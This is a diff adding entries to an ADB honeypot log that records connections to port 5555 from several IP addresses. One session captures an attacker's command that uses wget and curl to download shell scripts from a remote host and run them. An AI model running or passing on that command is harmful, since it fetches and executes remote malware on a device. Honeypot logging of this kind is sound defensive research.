@@ -219,3 +219,36 @@
 2022-04-11 08:35:13,184 - 139883717700408 - ADBHoneypot - INFO - 6802.960077285767	69.157.180.154	connection closed
 2022-04-11 08:35:13,184 - 139883717700408 - ADBHoneypot - INFO - {'eventid': 'adbhoney.session.closed', 'src_ip': '69.157.180.154', 'duration': '6802.96', 'timestamp': '2022-04-11T08:35:13.184368Z', 'unixtime': 1649666113, 'session': '22e90bc3b35c', 'sensor': 'honeypot01'}
 2022-04-11 08:35:13,185 - 139883717700408 - ADBHoneypot - INFO - {'eventid': 'adbhoney.session.closed', 'src_ip': '194.42.139.129', 'duration': '3984.87', 'timestamp': '2022-04-11T08:35:13.182260Z', 'unixtime': 1649666113, 'session': '1d392e4cda81', 'sensor': 'honeypot01'}
+2022-04-11 08:54:04,256 - 139883717700408 - ADBHoneypot - INFO - Received a connection, creating an ADBConnection.
+2022-04-11 08:56:42,059 - 139883717700408 - ADBHoneypot - INFO - 46.70.233.96 connection start (c3d838b0129e)
+2022-04-11 08:58:34,069 - 139883717700408 - ADBHoneypot - INFO - {'eventid': 'adbhoney.session.connect', 'src_ip': '46.70.233.96', 'src_port': 13444, 'dest_ip': '172.18.0.2', 'dest_port': '5555', 'timestamp': '2022-04-11T08:56:13.807645Z', 'unixtime': 1649667379, 'session': 'c3d838b0129e', 'sensor': 'honeypot01'}
+2022-04-11 08:59:01,525 - 139883717700408 - ADBHoneypot - INFO - data is none?: None
+2022-04-11 08:59:03,898 - 139883717700408 - ADBHoneypot - INFO - 230.84115648269653	46.70.233.96	connection closed
+2022-04-11 08:59:05,447 - 139883717700408 - ADBHoneypot - INFO - {'eventid': 'adbhoney.session.closed', 'src_ip': '46.70.233.96', 'duration': '230.84', 'timestamp': '2022-04-11T08:59:01.637269Z', 'unixtime': 1649667541, 'session': 'c3d838b0129e', 'sensor': 'honeypot01'}
+2022-04-11 09:06:53,936 - 139883717700408 - ADBHoneypot - INFO - Received a connection, creating an ADBConnection.
+2022-04-11 09:45:18,824 - 139883717700408 - ADBHoneypot - INFO - Received a connection, creating an ADBConnection.
+2022-04-11 10:25:57,402 - 139883717700408 - ADBHoneypot - INFO - 222.198.133.56 connection start (ba6411a449b8)
+2022-04-11 10:25:57,402 - 139883717700408 - ADBHoneypot - INFO - Received a connection, creating an ADBConnection.
+2022-04-11 10:25:57,403 - 139883717700408 - ADBHoneypot - INFO - {'eventid': 'adbhoney.session.connect', 'src_ip': '222.198.133.56', 'src_port': 49627, 'dest_ip': '172.18.0.2', 'dest_port': '5555', 'timestamp': '2022-04-11T09:19:38.072520Z', 'unixtime': 1649668825, 'session': 'ba6411a449b8', 'sensor': 'honeypot01'}
+2022-04-11 10:25:57,569 - 139883717700408 - ADBHoneypot - INFO - 125.130.224.219 connection start (b043f17bbff2)
+2022-04-11 10:25:57,570 - 139883717700408 - ADBHoneypot - INFO - Received a connection, creating an ADBConnection.
+2022-04-11 10:25:57,570 - 139883717700408 - ADBHoneypot - INFO - {'eventid': 'adbhoney.session.connect', 'src_ip': '125.130.224.219', 'src_port': 57871, 'dest_ip': '172.18.0.2', 'dest_port': '5555', 'timestamp': '2022-04-11T10:25:57.356364Z', 'unixtime': 1649672757, 'session': 'b043f17bbff2', 'sensor': 'honeypot01'}
+2022-04-11 10:25:57,570 - 139883717700408 - ADBHoneypot - INFO - 112.119.173.165 connection start (eb30f6055b05)
+2022-04-11 10:25:57,570 - 139883717700408 - ADBHoneypot - INFO - {'eventid': 'adbhoney.session.connect', 'src_ip': '112.119.173.165', 'src_port': 33613, 'dest_ip': '172.18.0.2', 'dest_port': '5555', 'timestamp': '2022-04-11T10:25:57.449763Z', 'unixtime': 1649672757, 'session': 'eb30f6055b05', 'sensor': 'honeypot01'}
+2022-04-11 10:25:57,571 - 139883717700408 - ADBHoneypot - INFO - 194.31.98.167 connection start (236ee1bb821d)
+2022-04-11 10:25:57,571 - 139883717700408 - ADBHoneypot - INFO - {'eventid': 'adbhoney.session.connect', 'src_ip': '194.31.98.167', 'src_port': 47018, 'dest_ip': '172.18.0.2', 'dest_port': '5555', 'timestamp': '2022-04-11T10:25:57.450279Z', 'unixtime': 1649672757, 'session': '236ee1bb821d', 'sensor': 'honeypot01'}
+2022-04-11 10:25:57,571 - 139883717700408 - ADBHoneypot - INFO - shell command is cd /data/local/tmp/; wget http://194.31.98.169/w.sh; sh w.sh; curl http://194.31.98.169/c.sh; sh c.sh, len 101
+2022-04-11 10:25:57,572 - 139883717700408 - ADBHoneypot - INFO - 194.31.98.167	b'shell:cd /data/local/tmp/; wget http://194.31.98.169/w.sh; sh w.sh; curl http://194.31.98.169/c.sh; sh c.sh'
+2022-04-11 10:25:57,572 - 139883717700408 - ADBHoneypot - INFO - {'eventid': 'adbhoney.command.input', 'input': 'cd /data/local/tmp/; wget http://194.31.98.169/w.sh; sh w.sh; curl http://194.31.98.169/c.sh; sh c.sh', 'src_ip': '194.31.98.167', 'timestamp': '2022-04-11T10:25:57.451467Z', 'unixtime': 1649672757, 'session': '236ee1bb821d', 'sensor': 'honeypot01'}
+2022-04-11 10:25:58,320 - 139883717700408 - ADBHoneypot - INFO - data is none?: None
+2022-04-11 10:25:58,321 - 139883717700408 - ADBHoneypot - INFO - 4510.437595367432	222.198.133.56	connection closed
+2022-04-11 10:25:58,322 - 139883717700408 - ADBHoneypot - INFO - {'eventid': 'adbhoney.session.closed', 'src_ip': '222.198.133.56', 'duration': '4510.44', 'timestamp': '2022-04-11T10:25:58.320608Z', 'unixtime': 1649672758, 'session': 'ba6411a449b8', 'sensor': 'honeypot01'}
+2022-04-11 10:25:58,404 - 139883717700408 - ADBHoneypot - INFO - data is none?: None
+2022-04-11 10:25:58,404 - 139883717700408 - ADBHoneypot - INFO - 2268.239490747452	125.130.224.219	connection closed
+2022-04-11 10:25:58,404 - 139883717700408 - ADBHoneypot - INFO - {'eventid': 'adbhoney.session.closed', 'src_ip': '125.130.224.219', 'duration': '2268.24', 'timestamp': '2022-04-11T10:25:58.403742Z', 'unixtime': 1649672758, 'session': 'b043f17bbff2', 'sensor': 'honeypot01'}
+2022-04-11 10:25:58,453 - 139883717700408 - ADBHoneypot - INFO - data is none?: None
+2022-04-11 10:25:58,454 - 139883717700408 - ADBHoneypot - INFO - 1.1475830078125	194.31.98.167	connection closed
+2022-04-11 10:25:58,454 - 139883717700408 - ADBHoneypot - INFO - {'eventid': 'adbhoney.session.closed', 'src_ip': '194.31.98.167', 'duration': '1.15', 'timestamp': '2022-04-11T10:25:58.453240Z', 'unixtime': 1649672758, 'session': '236ee1bb821d', 'sensor': 'honeypot01'}
+2022-04-11 10:25:58,454 - 139883717700408 - ADBHoneypot - INFO - data is none?: None
+2022-04-11 10:25:58,455 - 139883717700408 - ADBHoneypot - INFO - 1.2600886821746826	112.119.173.165	connection closed
+2022-04-11 10:25:58,455 - 139883717700408 - ADBHoneypot - INFO - {'eventid': 'adbhoney.session.closed', 'src_ip': '112.119.173.165', 'duration': '1.26', 'timestamp': '2022-04-11T10:25:58.453537Z', 'unixtime': 1649672758, 'session': 'eb30f6055b05', 'sensor': 'honeypot01'}
